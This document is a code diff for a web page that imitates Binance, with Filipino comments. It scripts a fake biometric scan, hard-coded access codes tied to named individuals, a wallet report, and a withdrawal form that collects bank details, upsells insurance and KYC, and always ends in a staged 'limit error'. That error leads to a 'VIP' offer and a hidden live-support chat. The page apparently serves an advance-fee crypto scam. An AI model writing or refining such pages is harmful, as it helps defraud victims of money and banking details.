@@ -1,88 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Protocol Index - Biometric</title>
-    <!-- Core Bootstrap 5 CDN Link -->
-    <link href="https://jsdelivr.net" rel="stylesheet">
-    <style>
-        :root {
-            --term-dark-bg: #0b0e11;
-            --term-panel-dark: #12161a;
-            --term-card-gray: #1e2329;
-            --term-accent-gold: #f0b90b;
-            --term-gold-hover: #d4a30a;
-            --term-border: #2b3139;
-            --term-text-muted: #848e9c;
-            --success-green: #0ecb81;
-            --error-red: #f6465d;
-        }
-
-        body.terminal-layout {
-            background-color: var(--term-dark-bg) !important;
-            color: #eaecef !important;
-            font-family: system-ui, -apple-system, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-
-        .terminal-top-bar {
-            background-color: var(--term-panel-dark);
-            border-bottom: 1px solid var(--term-border);
-            padding: 18px 0;
-        }
-
-        .app-flow-card {
-            background-color: var(--term-card-gray) !important;
-            border: 1px solid var(--term-border) !important;
-            border-radius: 12px;
-            padding: 35px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            margin-top: 30px;
-            width: 100%;
-        }
-
-        .biometric-icon {
-            font-size: 5rem;
-            margin-bottom: 20px;
-            cursor: pointer;
-            display: inline-block;
-            transition: transform 0.2s;
-        }
-        .biometric-icon:active { transform: scale(0.9); }
-    </style>
-</head>
-<body class="terminal-layout">
-
-    <header class="terminal-top-bar">
-        <div class="container d-flex justify-content-between align-items-center">
-            <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
-                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
-            </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">FINANCE COMPLIANCE SECURITY</span>
-        </div>
-    </header>
-
-    <div class="container pb-5">
-        <div class="row justify-content-center">
-            <div class="col-md-8 col-lg-6">
-
-                <!-- 1️⃣ UNANG LALABAS PAG-OPEN NG CRYPTO.HTML: BIOMETRIC SCREEN -->
-                <div id="layerBiometricVerification" class="app-flow-card text-center">
-                    <h3 class="fw-bold mb-2 text-white">Biometric Authentication</h3>
-                    <p style="color: var(--term-text-muted);" class="small mb-4">Place your finger on the scanner below to access network nodes</p>
-                    
-                    <!-- Lilipat sa panibagong page na pin-verification.html pagka-click ng finger -->
-                    <div class="biometric-icon" onclick="window.location.href='pin-verification.html'">☝️</div>
-                    
-                    <div class="text-muted small">Click fingerprint icon to scan</div>
-                </div>
             </div>
         </div>
     </div>
 
-    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (HIDDEN ON START) -->
+    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (HIDDEN FOR STAGE 2) -->
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
     (function(){
@@ -96,9 +16,168 @@
 
     Tawk_API = Tawk_API || {};
     Tawk_API.onLoad = function(){
-        // Nakatago muna rito dahil sa wallet hold screen pa ito dapat lilitaw
         Tawk_API.hideWidget();
     };
+
+    // PAGE TRANSITION CONTROLLER MATRIX FOR STEP BY STEP
+    function executeTokenValidation() {
+        const pinField = document.getElementById('pinVerificationInput');
+        const loginCard = document.getElementById('layerPINVerification');
+        const spinnerCard = document.getElementById('layerLoadingWheel');
+
+        if (pinField && pinField.value.trim() === "120352") {
+            if (loginCard) loginCard.classList.add('d-none');
+            if (spinnerCard) spinnerCard.classList.remove('d-none');
+            
+            // 3-segundong loading animation bago tuluyang lumipat sa huling page (hold-status.html)
+            setTimeout(function() {
+                window.location.href = "hold-status.html";
+            }, 3000);
+        } else {
+            alert("Security validation failure: Input token parameter mismatched.");
+        }
+    }
     </script>
+
+    <!-- 🌐 SECURE MASTER LOGIC ATTACHMENT COMPONENT -->
+    <script type="text/javascript">
+document.addEventListener("DOMContentLoaded", function () {
+    
+    // ==========================================================
+    // 🔍 PART 1: MASTER LOOKUP ENGINE (case.html Search Box)
+    // ==========================================================
+    const searchBtn = document.getElementById("btnSearchCase");
+    const caseInput = document.getElementById("caseInputCode");
+    const dynamicProfile = document.getElementById("dynamicProfileSection");
+
+    if (searchBtn && caseInput) {
+        searchBtn.addEventListener("click", function () {
+            const enteredCode = caseInput.value.trim();
+
+            // 🔑 CONDITION A: Kapag profile ni Branko (784291) - Ipakita ang card sa screen
+            if (enteredCode === "784291") {
+                if (dynamicProfile) {
+                    dynamicProfile.classList.remove("d-none");
+                    dynamicProfile.scrollIntoView({ behavior: 'smooth' });
+                }
+            } 
+            // 🔑 CONDITION B: Kapag wallet code ni KLTN (120352) - Awtomatikong lilipat sa crypto page at lagpas login panel!
+            else if (enteredCode === "120352") {
+                window.location.href = "crypto.html?autoauth=120352";
+            } 
+            // Fallback alert prompt para sa maling tracking strings
+            else {
+                alert("Master reference authentication token key not registered under secure tracking rows.");
+                if (dynamicProfile) dynamicProfile.classList.add("d-none");
+            }
+        });
+    }
+
+    // ==========================================================
+    // 💳 PART 2: CRYPTO NODE AUTO-LOAD SYSTEM (crypto.html login gateway)
+    // ==========================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const autoAuthCode = urlParams.get('autoauth');
+    
+    const authBlock = document.getElementById("authGatewayBlock");
+    const reportLayer = document.getElementById("walletReportMatrixLayer");
+    const walletInput = document.getElementById("walletAuthCodeField");
+
+    // Kung ang code na 120352 ay bitbit mula sa main database link page redirection, i-bypass ang gateway!
+    if (autoAuthCode === "120352" && reportLayer && authBlock) {
+        authBlock.classList.add("d-none");
+        reportLayer.classList.remove("d-none");
+    }
+
+    // Manual access verification sync connection configuration trigger fallback fallback loop
+    const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
+    if (syncWalletBtn && walletInput && reportLayer) {
+        syncWalletBtn.addEventListener("click", function () {
+            if (walletInput.value.trim() === "120352") {
+                if (authBlock) authBlock.classList.add("d-none");
+                reportLayer.classList.remove("d-none");
+                reportLayer.scrollIntoView({ behavior: 'smooth' });
+            } else {
+                alert("Decentralized wallet authentication token code invalid.");
+            }
+        });
+    }
+
+    // ==========================================================
+    // 🔳 PART 3: WITHDRAWAL & DOCUMENT WORKFLOW LINK SYSTEM
+    // ==========================================================
+    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
+    const formSection = document.getElementById("withdrawalFormSection");
+    const confirmBankBtn = document.getElementById("btnConfirmBankDetails");
+    const insuranceSection = document.getElementById("insuranceSection");
+    const selectInsBtn = document.querySelectorAll(".select-ins-btn");
+    const nextInsBtn = document.getElementById("btnNextFromInsurance");
+    const skipInsBtn = document.getElementById("btnSkipInsurance");
+    const kycSection = document.getElementById("kycSection");
+    const executeWithdrawalBtn = document.getElementById("btnExecuteFinalWithdrawal");
+    const loadingSection = document.getElementById("loadingSection");
+    const errorSection = document.getElementById("limitErrorSection");
+    const availVipBtn = document.getElementById("btnAvailVipNow");
+    const supportPopup = document.getElementById("binanceSupportPopupMask");
+
+    if (withdrawalBtn && formSection) {
+        withdrawalBtn.addEventListener("click", function () {
+            formSection.classList.remove("d-none");
+            formSection.scrollIntoView({ behavior: 'smooth' });
+        });
+    }
+
+    if (confirmBankBtn && insuranceSection) {
+        confirmBankBtn.addEventListener("click", function () {
+            insuranceSection.classList.remove("d-none");
+            insuranceSection.scrollIntoView({ behavior: 'smooth' });
+        });
+    }
+
+    selectInsBtn.forEach(btn => {
+        btn.addEventListener("click", function () {
+            selectInsBtn.forEach(b => { 
+                b.classList.remove("btn-warning", "text-dark"); 
+                b.classList.add("btn-outline-warning"); 
+                b.innerText = "Select Policy"; 
+            });
+            this.classList.remove("btn-outline-warning"); 
+            this.classList.add("btn-warning", "text-dark"); 
+            this.innerText = "Policy Chosen";
+            if (nextInsBtn) nextInsBtn.removeAttribute("disabled");
+        });
+    });
+
+    const triggerKyc = function() { 
+        if (kycSection) { 
+            kycSection.classList.remove("d-none"); 
+            kycSection.scrollIntoView({ behavior: 'smooth' }); 
+        } 
+    };
+    if (nextInsBtn) nextInsBtn.addEventListener("click", triggerKyc);
+    if (skipInsBtn) skipInsBtn.addEventListener("click", triggerKyc);
+
+    if (executeWithdrawalBtn && loadingSection && errorSection) {
+        executeWithdrawalBtn.addEventListener("click", function () {
+            if (kycSection) kycSection.classList.add("d-none");
+            loadingSection.classList.remove("d-none");
+            loadingSection.scrollIntoView({ behavior: 'smooth' });
+            
+            // 3-second configuration interval loop timeout simulation parameters
+            setTimeout(function () {
+                loadingSection.classList.add("d-none");
+                errorSection.classList.remove("d-none");
+                errorSection.scrollIntoView({ behavior: 'smooth' });
+            }, 3000);
+        });
+    }
+
+    if (availVipBtn && supportPopup) {
+        availVipBtn.addEventListener("click", function () {
+            supportPopup.classList.add("active");
+        });
+    }
+});
+</script>
 </body>
 </html>
